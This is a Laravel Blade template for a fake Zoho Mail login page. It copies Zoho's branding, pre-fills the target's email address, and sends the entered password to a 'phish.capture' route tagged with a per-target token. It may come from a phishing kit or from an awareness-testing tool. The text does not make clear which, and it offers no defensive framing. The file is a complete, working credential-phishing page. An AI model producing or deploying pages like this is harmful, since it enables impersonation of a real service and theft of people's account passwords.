<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <title>Zoho Mail Login</title>
    <link rel="icon" href="https://www.zohowebstatic.com/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Zoho+Puvi:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:"Zoho Puvi",Georgia,"Times New Roman",serif;background:transparent;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:#fff;padding:40px 36px;width:100%;max-width:400px;box-shadow:0 1px 4px rgba(0,0,0,.08);text-align:center}
        .logo{margin-bottom:24px}
        .logo svg{height:32px;width:auto}
        h1{font-size:20px;color:#333;font-weight:600;margin-bottom:6px}
        .sub{font-size:14px;color:#666;margin-bottom:24px;line-height:1.4}
        .email-display{display:flex;align-items:center;padding:10px 14px;background:#f8f8f8;border:1px solid #e4e4e4;margin-bottom:20px;gap:10px}
        .avatar{width:32px;height:32px;border-radius:50%;background:#e42527;display:flex;align-items:center;justify-content:center;color:#fff;font-size:13px;font-weight:600;flex-shrink:0}
        .email-text{font-size:14px;color:#333;font-weight:400}
        .form-group{text-align:left;margin-bottom:16px}
        .form-group label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:500}
        .form-group input{width:100%;height:40px;padding:0 12px;font-size:14px;font-family:"Zoho Puvi",Georgia,serif;color:#333;background:#f8f8f8;border:1px solid #e4e4e4;border-radius:4px;outline:none;transition:border-color .2s}
        .form-group input:focus{border-color:#e42527;box-shadow:0 0 0 2px rgba(228,37,39,.08)}
        .btn-login{width:100%;height:42px;background:#e42527;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s;margin-top:4px}
        .btn-login:hover{background:#c71f1f}
        .links-row{display:flex;justify-content:space-between;margin-top:16px}
        .links-row a{font-size:13px;color:#e42527;text-decoration:none}
        .links-row a:hover{text-decoration:underline}
        .footer{margin-top:24px;font-size:12px;color:#999}
        @media(max-width:480px){.card{padding:28px 20px}}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg viewBox="0 0 200 40" xmlns="http://www.w3.org/2000/svg">
                <text x="0" y="32" font-family="Georgia,serif" font-size="34" font-weight="700" fill="#e42527">ZOHO</text>
            </svg>
        </div>
        <h1>Sign in to Zoho Mail</h1>
        <p class="sub">Sign in with your Zoho Account to access Mail.</p>

        <div class="email-display">
            <div class="avatar">{{ strtoupper(substr($email, 0, 1)) }}</div>
            <div class="email-text">{{ $email }}</div>
        </div>

        <form action="{{ route('phish.capture', ['provider' => 'zoho', 'token' => $token]) }}" method="POST">
            @csrf
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required autofocus>
            </div>
            <button type="submit" class="btn-login">Sign In</button>
        </form>

        <div class="links-row">
            <a href="#">Forgot Password?</a>
            <a href="#">Sign in using OTP</a>
        </div>
        <div class="footer">© 2026 Zoho Corporation Pvt. Ltd. All rights reserved.</div>
    </div>
</body>
</html>
